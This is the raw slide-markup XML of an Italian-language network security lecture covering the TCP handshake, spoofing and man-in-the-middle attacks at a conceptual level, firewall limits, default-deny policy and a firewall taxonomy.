            <a:off x="5609329" y="5271329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ACK Messaggio 1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src = B - Porta src = D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dst = A - Porta dst = C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Comunicazione tramite protocollo TCP</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="214" name="Google Shape;214;p27"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3318250" y="1887425"/>
            <a:ext cx="0" cy="45366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7"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5659775" y="1887425"/>
            <a:ext cx="0" cy="45366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6" name="Google Shape;216;p27"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3341813" y="3732545"/>
            <a:ext cx="2294400" cy="71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7"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="3339725" y="4521745"/>
            <a:ext cx="2307300" cy="586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27"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3341813" y="5207095"/>
            <a:ext cx="2294400" cy="71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7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="382975" y="3388370"/>
            <a:ext cx="2759400" cy="10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F</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it" u="sng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YN packet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src = A</a:t>
            </a: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 - Porta src = C</a:t>
            </a:r>
            <a:endParaRPr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dst = B </a:t>
            </a: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- Porta dst = D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5622375" y="4521745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F</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it" u="sng">
                <a:latin typeface="Exo 2"/>
                <a:ea typeface="Exo 2"/>
                <a:cs typeface="Exo 2"/>
                <a:sym typeface="Exo 2"/>
              </a:rPr>
              <a:t>YN-ACK packet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src = B - Porta src = D</a:t>
            </a:r>
            <a:endParaRPr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IP dst = A - Porta dst = C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537375" y="4935921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ACK packet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src = A - Porta src = C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dst = B - Porta dst = D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535275" y="1773779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Messaggio N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src = A - Porta src = C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dst = B - Porta dst = D</a:t>
            </a:r>
            <a:endParaRPr u="sng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23" name="Google Shape;223;p27"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3341813" y="2109604"/>
            <a:ext cx="2294400" cy="713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7"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="3326679" y="2879004"/>
            <a:ext cx="2307300" cy="5865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7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5609329" y="2879004"/>
            <a:ext cx="27594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latin typeface="Exo 2"/>
                <a:ea typeface="Exo 2"/>
                <a:cs typeface="Exo 2"/>
                <a:sym typeface="Exo 2"/>
              </a:rPr>
              <a:t>ACK Messaggio N</a:t>
            </a:r>
            <a:endParaRPr u="sng"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src = B - Porta src = D</a:t>
            </a:r>
            <a:endParaRPr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rPr>
              <a:t>IP dst = A - Porta dst = C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Attacchi di rete</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p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principali attacchi di rete del passato miravano a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it"/>
              <a:t>manipolare</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it"/>
              <a:t> identità o indirizzi per impersonare (spoofing) altri dispositivi.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IP Spoofing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Falsificazione dell’indirizzo IP sorgente per aggirare controlli o confondere il tracciamento.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DNS Spoofing / DNS Cache Poisoning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Inserimento di record DNS falsi per reindirizzare gli utenti verso siti malevoli.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DHCP Spoofing</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-37973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Un finto server DHCP assegna gateway o DNS errati per portare il traffico su un host controllato.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Man-in-the-Middle (MITM)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="237" name="Google Shape;237;p29" title="shutterstock_7587128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688" y="2891050"/>
            <a:ext cx="5478624" cy="365242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L’attaccante mira a mettersi in mezzo alla comunicazione fra due macchine, </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="it"/>
              <a:t>passivamente</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it"/>
              <a:t> o </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="it"/>
              <a:t>attivamente</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it"/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Firewall</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="244" name="Google Shape;244;p30"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="1536624"/>
            <a:ext cx="8520600" cy="49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Firewall</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it"/>
              <a:t>: sistema di controllo dell’accesso alla rete che verifica tutti i pacchetti che lo attraversano.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sue funzioni principali sono generalmente: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Filtraggio dei pacchetti IP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Network Address Translation (NAT)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Deve essere l’unico punto di controllo tra la rete protetta e le reti esterne.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Nota sulla grammatica</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="250" name="Google Shape;250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 tener presente che</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it"/>
              <a:t>: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"firewall" – corretto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“fire wall” – errato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“un firewall” (IT) – corretto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“una firewall” (IT) – </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it"/>
              <a:t>errato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Un firewall (in edilizia) è una parete progettata per dividere un edificio e impedire la propagazione del fuoco.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“Wall of fire” è un incantesimo di 4° livello. (D&amp;D)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Firewall non sono onnipotenti</a:t>
            </a:r>
            <a:endParaRPr/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536620"/>
            <a:ext cx="8520600" cy="13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Un </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="it"/>
              <a:t>firewall</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it"/>
              <a:t> controlla tutto il traffico che transita attraverso di lui, e soltanto il traffico che transita attraverso di lui.</a:t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2120650" y="3789613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58" name="Google Shape;258;p32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3266350" y="4622288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59" name="Google Shape;259;p32"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="257" idx="2"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2693500" y="4280713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32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5205925" y="4157888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5503150" y="4419713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62" name="Google Shape;262;p32"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="258" idx="0"/>
            <a:endCxn id="260" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4631843" y="5150138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2"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="260" idx="3"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5287825" y="5152238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2"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="261" idx="2"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6008950" y="4910813"/>
            <a:ext cx="0" cy="23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2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4962950" y="3759413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5415850" y="5326013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67" name="Google Shape;267;p32"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6940275" y="5158633"/>
            <a:ext cx="0" cy="283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68" name="Google Shape;2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881" y="5224400"/>
            <a:ext cx="855501" cy="85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8781" y="2882405"/>
            <a:ext cx="907101" cy="9071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/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4942646" y="5088063"/>
            <a:ext cx="615900" cy="1161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Firewall non sono onnipotenti</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="276" name="Google Shape;276;p33"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="1536620"/>
            <a:ext cx="8520600" cy="13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Impotente contro gli attacchi interni (a meno che la rete non sia suddivisa/segmentata in qualche modo).</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="277" name="Google Shape;277;p33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2120650" y="3789613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3266350" y="4622288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79" name="Google Shape;279;p33"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="277" idx="2"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2693500" y="4280713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33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5205925" y="4157888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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5503150" y="4419713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82" name="Google Shape;282;p33"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="278" idx="0"/>
            <a:endCxn id="280" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4631843" y="5150138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3"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="280" idx="3"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5287825" y="5152238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3"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="281" idx="2"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6008950" y="4910813"/>
            <a:ext cx="0" cy="23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3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4962950" y="3759413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5415850" y="5326013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287" name="Google Shape;287;p33"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6940275" y="5158633"/>
            <a:ext cx="0" cy="283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8" name="Google Shape;2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6881" y="5224400"/>
            <a:ext cx="855501" cy="855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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5902825" y="5083827"/>
            <a:ext cx="1101300" cy="133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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="6755590" y="5184984"/>
            <a:ext cx="368100" cy="147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 rot="5400000">
            <a:off x="5757816" y="4972219"/>
            <a:ext cx="368100" cy="147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1076" y="2835643"/>
            <a:ext cx="1011600" cy="10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Firewall non sono onnipotenti</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="298" name="Google Shape;298;p34"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="1536639"/>
            <a:ext cx="8520600" cy="49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</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="it"/>
              <a:t>firewall</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it"/>
              <a:t> controlla tutto il traffico che transita attraverso di lui, e soltanto il traffico che transita attraverso di lui.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Impotente contro gli attacchi interni (a meno che la rete non sia suddivisa/segmentata in qualche modo).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In generale, è </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="it"/>
              <a:t>impotente contro i percorsi non controllati</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it"/>
              <a:t>. Per esempio: un modem o una connessione 5G su una macchina che è anche collegata a una LAN.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Percorsi non controllati</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="304" name="Google Shape;304;p35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1546152" y="2991718"/>
            <a:ext cx="1317600" cy="564900"/>
          </a:xfrm>
          <a:prstGeom prst="rect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10">
                <a:latin typeface="Exo 2"/>
                <a:ea typeface="Exo 2"/>
                <a:cs typeface="Exo 2"/>
                <a:sym typeface="Exo 2"/>
              </a:rPr>
              <a:t>REMOTE</a:t>
            </a:r>
            <a:endParaRPr sz="161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2863861" y="3949404"/>
            <a:ext cx="1571832" cy="1214244"/>
          </a:xfrm>
          <a:prstGeom prst="cloud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10">
                <a:latin typeface="Exo 2"/>
                <a:ea typeface="Exo 2"/>
                <a:cs typeface="Exo 2"/>
                <a:sym typeface="Exo 2"/>
              </a:rPr>
              <a:t>Internet</a:t>
            </a:r>
            <a:endParaRPr sz="1610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306" name="Google Shape;306;p35"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="304" idx="2"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2204952" y="3556618"/>
            <a:ext cx="800100" cy="753300"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1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5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5094633" y="3415283"/>
            <a:ext cx="94200" cy="2287200"/>
          </a:xfrm>
          <a:prstGeom prst="rect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5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5436482" y="3716416"/>
            <a:ext cx="1163400" cy="564900"/>
          </a:xfrm>
          <a:prstGeom prst="rect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10">
                <a:latin typeface="Exo 2"/>
                <a:ea typeface="Exo 2"/>
                <a:cs typeface="Exo 2"/>
                <a:sym typeface="Exo 2"/>
              </a:rPr>
              <a:t>WS</a:t>
            </a:r>
            <a:endParaRPr sz="1610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309" name="Google Shape;309;p35"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="305" idx="0"/>
            <a:endCxn id="307" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4434383" y="4556526"/>
            <a:ext cx="660300" cy="2400"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1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35"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="307" idx="3"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5188833" y="4558883"/>
            <a:ext cx="1907100" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1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35"/>
          <p:cNvCxnSpPr>
            <a:stCxn id="308" idx="2"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6018182" y="4281316"/>
            <a:ext cx="0" cy="264600"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1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5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4815179" y="2956984"/>
            <a:ext cx="6603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10">
                <a:latin typeface="Exo 2"/>
                <a:ea typeface="Exo 2"/>
                <a:cs typeface="Exo 2"/>
                <a:sym typeface="Exo 2"/>
              </a:rPr>
              <a:t>FW1</a:t>
            </a:r>
            <a:endParaRPr sz="161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3" name="Google Shape;313;p35"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5336075" y="4758781"/>
            <a:ext cx="14778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10">
                <a:latin typeface="Exo 2"/>
                <a:ea typeface="Exo 2"/>
                <a:cs typeface="Exo 2"/>
                <a:sym typeface="Exo 2"/>
              </a:rPr>
              <a:t>Local Network </a:t>
            </a:r>
            <a:endParaRPr sz="1610"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314" name="Google Shape;314;p35"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7089369" y="4566273"/>
            <a:ext cx="0" cy="326100"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="219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5" name="Google Shape;3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911" y="4641914"/>
            <a:ext cx="983940" cy="98396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5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5896162" y="4480236"/>
            <a:ext cx="1266600" cy="153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5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="6876946" y="4596505"/>
            <a:ext cx="423300" cy="169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5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="5729372" y="4351797"/>
            <a:ext cx="423300" cy="1695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105150" lIns="105150" spcFirstLastPara="1" rIns="105150" wrap="square" tIns="105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59994" y="1894526"/>
            <a:ext cx="1163475" cy="116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2749" y="4281258"/>
            <a:ext cx="695700" cy="69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1" name="Google Shape;321;p35"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="3606209" y="2957101"/>
            <a:ext cx="3762383" cy="1523220"/>
            <a:chOff x="3949666" y="3880950"/>
            <a:chExt cx="3418483" cy="1024013"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:cxnSp>
          <p:nvCxnSpPr>
            <p:cNvPr id="322" name="Google Shape;322;p35"/>
            <p:cNvCxnSpPr/>
            <p:nvPr/>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="7368149" y="4084708"/>
              <a:ext cx="0" cy="643500"/>
            </a:xfrm>
            <a:prstGeom prst="straightConnector1">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln cap="flat" cmpd="sng" w="35125">
              <a:solidFill>
                <a:srgbClr val="FF0000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35"/>
            <p:cNvCxnSpPr/>
            <p:nvPr/>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm rot="10800000">
              <a:off x="3952726" y="3880950"/>
              <a:ext cx="3414600" cy="0"/>
            </a:xfrm>
            <a:prstGeom prst="straightConnector1">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln cap="flat" cmpd="sng" w="35125">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
              <a:prstDash val="dashDot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35"/>
            <p:cNvCxnSpPr/>
            <p:nvPr/>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm rot="10800000">
              <a:off x="3949666" y="4152863"/>
              <a:ext cx="0" cy="752100"/>
            </a:xfrm>
            <a:prstGeom prst="straightConnector1">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln cap="flat" cmpd="sng" w="35125">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
              <a:prstDash val="dashDot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firewall sono computer (o router corazzati)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="330" name="Google Shape;330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firewall stesso è un computer: può avere vulnerabilità ed essere compromesso.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Nella maggior parte dei casi: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è una macchina dedicata, un dispositivo embedded con solo un firmware.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Di solito offre pochi o nessun servizio.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u="sng"/>
              <a:t>Superficie d’attacco ridotta.</a:t>
            </a:r>
            <a:endParaRPr b="1" u="sn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Policy di sicurezza = Regole del Firewall</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="336" name="Google Shape;336;p3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firewall è come un semplice “buttafuori alla porta”.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-3663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Si limita ad applicare delle regole.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Se le regole sono sbagliate → nessuna protezione.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Le regole del firewall sono essenzialmente l’implementazione tecnica delle politiche di sicurezza di livello superiore.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Ad esempio: “Non voglio che nessun client possa scaricare la posta da server email esterni!”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Una politica di sicurezza deve basarsi su un principio di default deny, cioè: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“nega tutto, tranne…”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/>
          <p:nvPr/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400">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Exo 2"/>
                <a:ea typeface="Exo 2"/>
                <a:cs typeface="Exo 2"/>
                <a:sym typeface="Exo 2"/>
              </a:rPr>
              <a:t>Stack TCP/IP</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="3400">
              <a:solidFill>
                <a:srgbClr val="000000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42" name="Google Shape;342;p38"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="953600" y="4584850"/>
            <a:ext cx="2973900" cy="1312200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 6451" name="adj"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="B4A7D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Exo 2"/>
                <a:ea typeface="Exo 2"/>
                <a:cs typeface="Exo 2"/>
                <a:sym typeface="Exo 2"/>
              </a:rPr>
              <a:t>Network Access</a:t>
            </a:r>
            <a:endParaRPr sz="18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953600" y="3907450"/>
            <a:ext cx="2973900" cy="6774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Exo 2"/>
                <a:ea typeface="Exo 2"/>
                <a:cs typeface="Exo 2"/>
                <a:sym typeface="Exo 2"/>
              </a:rPr>
              <a:t>Rete (IP e altri)</a:t>
            </a:r>
            <a:endParaRPr sz="18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44" name="Google Shape;344;p38"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="953600" y="3230050"/>
            <a:ext cx="2973900" cy="677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Exo 2"/>
                <a:ea typeface="Exo 2"/>
                <a:cs typeface="Exo 2"/>
                <a:sym typeface="Exo 2"/>
              </a:rPr>
              <a:t>Trasporto (TCP/UDP)</a:t>
            </a:r>
            <a:endParaRPr sz="18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953600" y="1917850"/>
            <a:ext cx="2973900" cy="1312200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 7257" name="adj"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="B6D7A8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latin typeface="Exo 2"/>
                <a:ea typeface="Exo 2"/>
                <a:cs typeface="Exo 2"/>
                <a:sym typeface="Exo 2"/>
              </a:rPr>
              <a:t>Applicativo (HTTP/HTTPS e altri)</a:t>
            </a:r>
            <a:endParaRPr sz="1800"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46" name="Google Shape;346;p38"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4572000" y="1917850"/>
            <a:ext cx="4260300" cy="27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t" sz="2800">
                <a:solidFill>
                  <a:srgbClr val="595959"/>
                </a:solidFill>
                <a:latin typeface="Exo 2"/>
                <a:ea typeface="Exo 2"/>
                <a:cs typeface="Exo 2"/>
                <a:sym typeface="Exo 2"/>
              </a:rPr>
              <a:t>Include tutti i protocolli che permettono a due computer di mandare e ricevere messaggi tramite internet.</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:solidFill>
                <a:srgbClr val="595959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47" name="Google Shape;347;p38"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="2315214">
            <a:off x="7095135" y="314227"/>
            <a:ext cx="2761420" cy="524932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it"/>
              <a:t>RECALL</a:t>
            </a:r>
            <a:endParaRPr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Tassonomia dei Firewall</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="353" name="Google Shape;353;p3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 dividiamo in base alle loro capacità di ispezione dei pacchetti (dai livelli più bassi ai più alti).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Firewall a livello di rete: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Packet Filter (livello di </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="it">
                <a:solidFill>
                  <a:srgbClr val="1155CC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>rete</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it"/>
              <a:t>)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Stateful Packet Filter (SPF) (livello di </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="it">
                <a:solidFill>
                  <a:srgbClr val="1155CC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>rete </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it"/>
              <a:t>e </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="it">
                <a:solidFill>
                  <a:srgbClr val="B45F06"/>
                </a:solidFill>
              </a:rPr>
              <a:t>trasporto</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it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Firewall a livello applicativo:</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-3797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Firewall Circuit Level (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it"/>
              <a:t>livello</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it"/>
              <a:t> di </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="it">
                <a:solidFill>
                  <a:srgbClr val="B45F06"/>
                </a:solidFill>
              </a:rPr>
              <a:t>trasporto</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it"/>
              <a:t> e </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="it">
                <a:solidFill>
                  <a:srgbClr val="38761D"/>
                </a:solidFill>
              </a:rPr>
              <a:t>applicativo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-3797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Application Proxies (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it"/>
              <a:t>livello </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="it">
                <a:solidFill>
                  <a:srgbClr val="38761D"/>
                </a:solidFill>
              </a:rPr>
              <a:t>applicativo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="it"/>
              <a:t>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8125"/>
            <a:ext cx="9144000" cy="5981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8125"/>
            <a:ext cx="9144000" cy="598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1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="195100" y="834350"/>
            <a:ext cx="8457900" cy="2775300"/>
          </a:xfrm>
          <a:prstGeom prst="rect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1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="195100" y="2820275"/>
            <a:ext cx="6809100" cy="2691600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/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1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3472900" y="2546075"/>
            <a:ext cx="3531300" cy="274200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="4A86E8"/>
          </a:solidFill>
          <a:ln cap="flat" cmpd="sng" w="3810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STATEFUL PACKET FILTERS</a:t>
            </a:r>
            <a:endParaRPr b="1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1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5121700" y="560150"/>
            <a:ext cx="3531300" cy="274200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF00FF"/>
          </a:solidFill>
          <a:ln cap="flat" cmpd="sng" w="38100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NETWORK PACKET FILTERS</a:t>
            </a:r>
            <a:endParaRPr b="1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4600"/>
            <a:ext cx="9144000" cy="6028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14600"/>
            <a:ext cx="9144000" cy="602878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43"/>
          <p:cNvSpPr/>
